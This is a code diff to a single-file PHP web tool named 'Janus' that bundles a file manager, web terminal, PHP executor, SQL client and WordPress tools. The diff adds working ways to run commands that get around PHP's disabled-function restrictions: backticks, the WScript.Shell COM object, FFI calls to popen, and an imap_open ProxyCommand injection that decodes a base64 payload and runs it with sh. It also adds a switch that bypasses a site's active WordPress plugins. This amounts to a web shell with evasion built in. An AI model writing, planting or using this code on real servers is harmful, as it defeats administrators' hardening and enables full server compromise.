@@ -7,7 +7,7 @@
  * on low-RAM servers and legacy hosting environments.
  *
  * Features:
- * - Tabbed Interface: Files manager, Server Info, Web Terminal (with Python/Perl wrappers), PHP executor, SQL client, and WP Tools.
+ * - Tabbed Interface: Files manager, Server Info, Web Terminal, PHP executor, SQL client, and WP Tools.
  * - Performance & RAM Optimized: Zero external JS/CSS dependencies (native textarea editor), near-zero memory footprint.
  * - Legacy Compatibility: Programmatically refactored to support legacy PHP environments down to version 5.5.
  * - Security: Gated behind secure SHA-256 password authentication.
@@ -101,6 +101,10 @@ function get_safe_target_path($name) {
 }
 
 // WordPress Helper functions
+function janus_return_empty_array() {
+    return array();
+}
+
 function bootstrap_wordpress($path) {
     $wp_load = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . 'wp-load.php';
     if (!file_exists($wp_load)) {
@@ -110,23 +114,93 @@ function bootstrap_wordpress($path) {
         return true;
     }
     
+    // Disable WordPress's own fatal error handler so we can catch/handle errors ourselves.
+    if (!defined('WP_DISABLE_FATAL_ERROR_HANDLER')) {
+        define('WP_DISABLE_FATAL_ERROR_HANDLER', true);
+    }
+    
+    // Register a custom shutdown handler to catch errors that we cannot catch via try/catch
+    // (such as compile errors or fatal errors on PHP 5).
+    register_shutdown_function('janus_wp_bootstrap_shutdown');
+    
+    // If Safe Mode is enabled, load plugin.php early and register filters to return empty array for active plugins
+    $safe_mode = isset($_COOKIE['fm_wp_safe_mode']) && $_COOKIE['fm_wp_safe_mode'] === '1';
+    if ($safe_mode) {
+        $plugin_file = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . 'wp-includes' . DIRECTORY_SEPARATOR . 'plugin.php';
+        if (file_exists($plugin_file)) {
+            require_once $plugin_file;
+            if (function_exists('add_filter')) {
+                add_filter('pre_option_active_plugins', 'janus_return_empty_array');
+                add_filter('pre_site_option_active_sitewide_plugins', 'janus_return_empty_array');
+            }
+        }
+    }
+    
     define('WP_USE_THEMES', false);
     global $wp, $wp_query, $wp_the_query, $wp_rewrite, $wp_did_header, $wpdb;
     
     $old_cwd = getcwd();
     chdir(dirname($wp_load));
     
+    $GLOBALS['janus_wp_bootstrapping'] = true;
+    
     ob_start();
-    try {
-        require_once $wp_load;
-    } catch (Exception $t) {
-        ob_end_clean();
-        chdir($old_cwd);
-        return false;
+    $success = false;
+    if (version_compare(PHP_VERSION, '7.0.0', '>=')) {
+        // We use eval to prevent PHP 5 compiler syntax errors when using 'Throwable' catch block.
+        $GLOBALS['janus_wp_load_path'] = $wp_load;
+        $eval_code = '
+            try {
+                require_once $GLOBALS["janus_wp_load_path"];
+                $GLOBALS["janus_wp_success"] = true;
+            } catch (Throwable $t) {
+                $GLOBALS["janus_wp_error"] = $t;
+            }
+        ';
+        eval($eval_code);
+        $success = isset($GLOBALS['janus_wp_success']) && $GLOBALS['janus_wp_success'];
+        unset($GLOBALS['janus_wp_load_path'], $GLOBALS['janus_wp_success']);
+    } else {
+        // PHP 5.5 syntax compatibility
+        try {
+            require_once $wp_load;
+            $success = true;
+        } catch (Exception $e) {
+            $GLOBALS['janus_wp_error'] = $e;
+        }
     }
     ob_end_clean();
     chdir($old_cwd);
-    return true;
+    
+    $GLOBALS['janus_wp_bootstrapping'] = false;
+    
+    if (isset($GLOBALS['janus_wp_error'])) {
+        return false;
+    }
+    
+    return $success;
+}
+
+function janus_wp_bootstrap_shutdown() {
+    if (isset($GLOBALS['janus_wp_bootstrapping']) && $GLOBALS['janus_wp_bootstrapping']) {
+        $error = error_get_last();
+        if ($error !== null && in_array($error['type'], array(E_ERROR, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR))) {
+            while (ob_get_level() > 0) {
+                ob_end_clean();
+            }
+            echo "<div style='padding: 20px; background: #11151d; color: #f87171; border: 1px solid #ef4444; font-family: sans-serif; border-radius: 4px; margin: 20px; max-width: 800px; box-shadow: 0 4px 6px rgba(0,0,0,0.3);'>";
+            echo "<h3 style='margin-top:0; color:#ef4444; font-size:18px;'>WordPress Bootstrapping Fatal Error Intercepted</h3>";
+            echo "<p style='font-size:14px;color:#9ca3af;margin-bottom:15px;'>A fatal error occurred while trying to bootstrap WordPress. Below are the details:</p>";
+            echo "<pre style='background:#1f2937; padding:15px; border-radius:4px; overflow-x:auto; font-family:monospace; color:#f3f4f6; font-size:13px; line-height:1.5; margin-bottom:15px; border:1px solid #2d3748;'>";
+            echo "<strong>Message:</strong> " . htmlspecialchars($error['message']) . "\n";
+            echo "<strong>File:</strong>    " . htmlspecialchars($error['file']) . "\n";
+            echo "<strong>Line:</strong>    " . htmlspecialchars($error['line']);
+            echo "</pre>";
+            echo "<p style='font-size:13px;color:#9ca3af;'><em>Note: This error was triggered by your WordPress codebase (usually a plugin or theme), not Janus. You can temporarily rename the offending plugin or theme directory to bypass it.</em></p>";
+            echo "<p style='margin-top:15px;'><a href='' style='display:inline-block; background:#3b82f6; color:#fff; padding:6px 12px; border-radius:4px; text-decoration:none; font-size:13px;'>&larr; Back to File Manager</a></p>";
+            echo "</div>";
+        }
+    }
 }
 
 function get_wordpress_admins() {
@@ -280,65 +354,33 @@ function get_enabled_exec_methods() {
             $enabled[] = $method;
         }
     }
-    return $enabled;
-}
-
-function check_binary_path($bin) {
-    static $cache = array();
-    if (isset($cache[$bin])) {
-        return $cache[$bin];
+    
+    // Bypass methods
+    if (!in_array('shell_exec', $disabled) && function_exists('shell_exec')) {
+        $enabled[] = 'backticks';
     }
-    $enabled = get_enabled_exec_methods();
-    if (empty($enabled)) {
-        $cache[$bin] = false;
-        return false;
+    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && class_exists('COM')) {
+        $enabled[] = 'wscript';
     }
-    $cmd = $bin . ' -v';
-    if (strpos($bin, 'python') !== false) {
-        $cmd = $bin . ' -V';
-    }
-    $res = run_system_cmd($cmd, 'auto');
-    if ($res['used'] !== 'failed' && $res['used'] !== 'none') {
-        $out = strtolower($res['output']);
-        if ($out !== '' && strpos($out, 'not found') === false && strpos($out, 'microsoft store') === false && strpos($out, 'not recognized') === false) {
-            if (strpos($out, 'python') !== false && strpos($bin, 'python') !== false) {
-                $cache[$bin] = true;
-                return true;
-            }
-            if (strpos($out, 'perl') !== false && $bin === 'perl') {
-                $cache[$bin] = true;
-                return true;
-            }
+    if (class_exists('FFI')) {
+        $ffi_enable = ini_get('ffi.enable');
+        if ($ffi_enable === '1' || $ffi_enable === 'true' || $ffi_enable === true || $ffi_enable === 1) {
+            $enabled[] = 'ffi';
         }
     }
-    $cache[$bin] = false;
-    return false;
+    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN' && function_exists('imap_open') && !in_array('imap_open', $disabled)) {
+        $enabled[] = 'imap';
+    }
+
+    return $enabled;
 }
 
 // Helper to run shell commands using specified execution function
 function run_system_cmd($cmd, $method = 'auto') {
-    if ($method === 'python') {
-        $py_bin = check_binary_path('python3') ? 'python3' : (check_binary_path('python') ? 'python' : '');
-        if ($py_bin === '') {
-            return ['output' => "Error: python/python3 binary not found on the system path.", 'used' => 'python'];
-        }
-        $wrapped_cmd = $py_bin . ' -c "import os, sys; os.system(sys.argv[1])" ' . escapeshellarg($cmd);
-        $res = run_system_cmd($wrapped_cmd, 'auto');
-        return ['output' => $res['output'], 'used' => 'python (' . $res['used'] . ')'];
-    }
-    if ($method === 'perl') {
-        if (!check_binary_path('perl')) {
-            return ['output' => "Error: perl binary not found on the system path.", 'used' => 'perl'];
-        }
-        $wrapped_cmd = 'perl -e "system(shift)" ' . escapeshellarg($cmd);
-        $res = run_system_cmd($wrapped_cmd, 'auto');
-        return ['output' => $res['output'], 'used' => 'perl (' . $res['used'] . ')'];
-    }
-
     $enabled = get_enabled_exec_methods();
     if (empty($enabled)) {
         return [
-            'output' => "Error: No command execution functions (shell_exec, exec, system, passthru, proc_open, popen) are enabled on this server.",
+            'output' => "Error: No command execution functions or bypass methods are enabled on this server.",
             'used' => 'none'
         ];
     }
@@ -409,6 +451,47 @@ function run_system_cmd($cmd, $method = 'auto') {
                     $success = true;
                 }
                 break;
+            case 'backticks':
+                $res = @`$cmd`;
+                if ($res !== null && $res !== false) {
+                    $output = $res;
+                    $success = true;
+                }
+                break;
+            case 'wscript':
+                try {
+                    $wsh = new COM('WScript.Shell');
+                    $exec = $wsh->Exec("cmd.exe /c " . $cmd);
+                    $out = $exec->StdOut->ReadAll();
+                    $err = $exec->StdErr->ReadAll();
+                    $output = $out . $err;
+                    $success = true;
+                } catch (Exception $e) {}
+                break;
+            case 'ffi':
+                try {
+                    $ffi = FFI::cdef("void *popen(const char *command, const char *type); int pclose(void *stream); char *fgets(char *s, int size, void *stream);");
+                    $stream = $ffi->popen($cmd . " 2>&1", "r");
+                    if ($stream !== null) {
+                        $buf = $ffi->new("char[4096]");
+                        while ($ffi->fgets($buf, 4096, $stream) !== null) {
+                            $output .= FFI::string($buf);
+                        }
+                        $ffi->pclose($stream);
+                        $success = true;
+                    }
+                } catch (Exception $e) {}
+                break;
+            case 'imap':
+                $payload = base64_encode($cmd . ' > /tmp/imap_cmd_out 2>&1');
+                $server = "x -oProxyCommand=echo\t" . $payload . "|base64\t-d|sh}";
+                @imap_open('{' . $server . 'INBOX', '', '');
+                if (file_exists('/tmp/imap_cmd_out')) {
+                    $output = file_get_contents('/tmp/imap_cmd_out');
+                    @unlink('/tmp/imap_cmd_out');
+                    $success = true;
+                }
+                break;
         }
         
         if ($success) {
@@ -436,7 +519,7 @@ function connect_db($data) {
         $dsn = "sqlite:" . $path;
         $pdo = new PDO($dsn);
     } else {
-        $host = (isset($data['host']) ? $data['host'] : '127.0.0.1');
+        $host = (isset($data['host']) ? $data['host'] : 'localhost');
         $port = (isset($data['port']) ? $data['port'] : '3306');
         $user = (isset($data['user']) ? $data['user'] : '');
         $pass = (isset($data['pass']) ? $data['pass'] : '');
@@ -557,7 +640,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if ($driver === 'sqlite') {
             $conn_data['path'] = (isset($_POST['path']) ? $_POST['path'] : '');
         } else {
-            $conn_data['host'] = (isset($_POST['host']) ? $_POST['host'] : '127.0.0.1');
+            $conn_data['host'] = (isset($_POST['host']) ? $_POST['host'] : 'localhost');
             $conn_data['port'] = (isset($_POST['port']) ? $_POST['port'] : '3306');
             $conn_data['user'] = (isset($_POST['user']) ? $_POST['user'] : '');
             $conn_data['pass'] = (isset($_POST['pass']) ? $_POST['pass'] : '');
@@ -1006,7 +1089,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $terminal_cmd = (isset($_POST['cmd']) ? $_POST['cmd'] : '');
         $selected_exec_method = (isset($_POST['exec_method']) ? $_POST['exec_method'] : 'auto');
         
-        $valid_methods = ['auto', 'shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen', 'python', 'perl'];
+        $valid_methods = ['auto', 'shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen', 'backticks', 'wscript', 'ffi', 'imap'];
         if (!in_array($selected_exec_method, $valid_methods)) {
             $selected_exec_method = 'auto';
         }
@@ -1054,6 +1137,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Save WP Path
     if ($action === 'set_wp_path') {
         $path = (isset($_POST['wp_path']) ? $_POST['wp_path'] : '');
+        $safe_mode = (isset($_POST['wp_safe_mode']) ? '1' : '0');
+        setcookie('fm_wp_safe_mode', $safe_mode, time() + 86400 * 30, '/');
         if ($path !== '') {
             $resolved = realpath($path);
             if ($resolved !== false && is_dir($resolved) && file_exists($resolved . DIRECTORY_SEPARATOR . 'wp-load.php')) {
@@ -1068,9 +1153,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit;
     }
 
+    // Toggle WP Safe Mode
+    if ($action === 'toggle_wp_safe_mode') {
+        $current = isset($_COOKIE['fm_wp_safe_mode']) && $_COOKIE['fm_wp_safe_mode'] === '1';
+        if ($current) {
+            setcookie('fm_wp_safe_mode', '0', time() + 86400 * 30, '/');
+            set_toast("WordPress Safe Mode disabled.");
+        } else {
+            setcookie('fm_wp_safe_mode', '1', time() + 86400 * 30, '/');
+            set_toast("WordPress Safe Mode enabled. Plugins bypassed.");
+        }
+        setcookie('fm_tab', 'wp', time() + 3600, '/');
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    }
+
     // Clear WP Path
     if ($action === 'clear_wp_path') {
         setcookie('fm_wp_path', 'none', time() + 86400 * 30, '/');
+        setcookie('fm_wp_safe_mode', '0', time() - 3600, '/');
         set_toast("WordPress path cleared.");
         setcookie('fm_tab', 'wp', time() + 3600, '/');
         header("Location: " . $_SERVER['PHP_SELF']);
@@ -1190,6 +1291,7 @@ usort($scan_items, function($a, $b) {
 });
 
 // WordPress setup
+$wp_safe_mode = (isset($_COOKIE['fm_wp_safe_mode']) && $_COOKIE['fm_wp_safe_mode'] === '1');
 $wp_is_valid = false;
 $wp_site_name = '';
 $wp_site_url = '';
@@ -2309,15 +2411,9 @@ function format_bytes($bytes, $precision = 1) {
                         <option value="auto" <?php echo $selected_exec_method === 'auto' ? 'selected' : ''; ?>>Auto-detect</option>
                         <?php
                         $enabled_methods = get_enabled_exec_methods();
-                        $all_methods = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen', 'python', 'perl'];
+                        $all_methods = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen', 'backticks', 'wscript', 'ffi', 'imap'];
                         foreach ($all_methods as $m) {
-                            if ($m === 'python') {
-                                $is_enabled = !empty($enabled_methods) && (check_binary_path('python') || check_binary_path('python3'));
-                            } elseif ($m === 'perl') {
-                                $is_enabled = !empty($enabled_methods) && check_binary_path('perl');
-                            } else {
-                                $is_enabled = in_array($m, $enabled_methods);
-                            }
+                            $is_enabled = in_array($m, $enabled_methods);
                             $label = $m . ($is_enabled ? '' : ' (disabled)');
                             $disabled_attr = $is_enabled ? '' : ' disabled';
                             $selected_attr = ($selected_exec_method === $m) ? ' selected' : '';
@@ -2367,7 +2463,7 @@ function format_bytes($bytes, $precision = 1) {
                 <!-- DATABASE LOGIN FORM -->
                 <?php
                 $saved_driver = (isset($db_conn_data['driver']) ? $db_conn_data['driver'] : 'mysql');
-                $saved_host = (isset($db_conn_data['host']) ? $db_conn_data['host'] : '127.0.0.1');
+                $saved_host = (isset($db_conn_data['host']) ? $db_conn_data['host'] : 'localhost');
                 $saved_port = (isset($db_conn_data['port']) ? $db_conn_data['port'] : '3306');
                 $saved_user = (isset($db_conn_data['user']) ? $db_conn_data['user'] : 'root');
                 $saved_dbname = (isset($db_conn_data['dbname']) ? $db_conn_data['dbname'] : '');
@@ -2547,12 +2643,30 @@ function format_bytes($bytes, $precision = 1) {
             <div class="modal-title">WordPress Tools</div>
             
             <?php if (!$wp_is_valid): ?>
+                <?php if (isset($GLOBALS['janus_wp_error'])): ?>
+                    <div class="db-conn-box" style="max-width: 500px; margin: 0 auto 20px auto; background-color: #1a161d; border: 1px solid #ef4444; padding: 15px; border-radius: 4px; color: #f87171;">
+                        <strong style="display: block; margin-bottom: 5px; color: #ef4444; font-size: 14px;">WordPress Bootstrap Error:</strong>
+                        <p style="font-size: 12px; margin: 0 0 10px 0; color: #9ca3af;">A catchable error was encountered while including <code>wp-load.php</code>:</p>
+                        <pre style="background: #111317; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 11px; overflow-x: auto; color: #f3f4f6; margin: 0; line-height: 1.4; border: 1px solid #2d3748;"><?php 
+                            $err = $GLOBALS['janus_wp_error'];
+                            if (is_object($err)) {
+                                echo htmlspecialchars(get_class($err) . ": " . $err->getMessage() . "\nin " . $err->getFile() . " on line " . $err->getLine());
+                            } else {
+                                echo htmlspecialchars(strval($err));
+                            }
+                        ?></pre>
+                    </div>
+                <?php endif; ?>
                 <div class="db-conn-box" style="max-width: 500px; margin: 0 auto; background-color: #11151d; border: 1px solid #2d3748; padding: 20px; border-radius: 4px;">
                     <form method="post">
                         <input type="hidden" name="action" value="set_wp_path">
                         <div style="margin-bottom: 15px;">
                             <label style="display: block; font-size: 11px; color: #9ca3af; text-transform: uppercase; margin-bottom: 5px;">WordPress Root Path</label>
                             <input type="text" name="wp_path" class="form-input" value="<?php echo htmlspecialchars($wp_path !== '' ? $wp_path : $autodetect_wp_path); ?>" placeholder="e.g. C:\laragon\www\wordpress" required style="width: 100%; box-sizing: border-box;">
+                        </div>
+                        <div style="margin-bottom: 15px; display: flex; align-items: center;">
+                            <input type="checkbox" id="wp_safe_mode" name="wp_safe_mode" value="1" <?php echo $wp_safe_mode ? 'checked' : ''; ?> style="margin-right: 10px; width: auto;">
+                            <label for="wp_safe_mode" style="font-size: 12px; color: #9ca3af; cursor: pointer; user-select: none;">Enable Safe Mode (Bypass Active Plugins)</label>
                         </div>
                         <button type="submit" class="action-btn" style="background-color: #3b82f6; border-color: #2563eb; width: 100%;">Save WordPress Path</button>
                     </form>
@@ -2566,7 +2680,13 @@ function format_bytes($bytes, $precision = 1) {
                                 <h3 style="margin: 0; color: #fff; font-size: 16px;"><?php echo htmlspecialchars($wp_site_name !== '' ? $wp_site_name : 'WordPress Site'); ?></h3>
                                 <a href="<?php echo htmlspecialchars($wp_site_url); ?>" target="_blank" style="color: #38bdf8; text-decoration: none; font-size: 12px;"><?php echo htmlspecialchars($wp_site_url); ?></a>
                             </div>
-                            <div>
+                            <div style="display: flex; gap: 10px;">
+                                <form method="post" style="display: inline;">
+                                    <input type="hidden" name="action" value="toggle_wp_safe_mode">
+                                    <button type="submit" class="action-btn" style="background-color: <?php echo $wp_safe_mode ? '#991b1b' : '#4b5563'; ?>; border-color: <?php echo $wp_safe_mode ? '#7f1d1d' : '#374151'; ?>;">
+                                        <?php echo $wp_safe_mode ? 'Safe Mode: ON (Plugins Skipped)' : 'Safe Mode: OFF'; ?>
+                                    </button>
+                                </form>
                                 <form method="post" style="display: inline;">
                                     <input type="hidden" name="action" value="clear_wp_path">
                                     <button type="submit" class="action-btn" style="background-color: #4b5563; border-color: #374151;">Disconnect / Change Path</button>
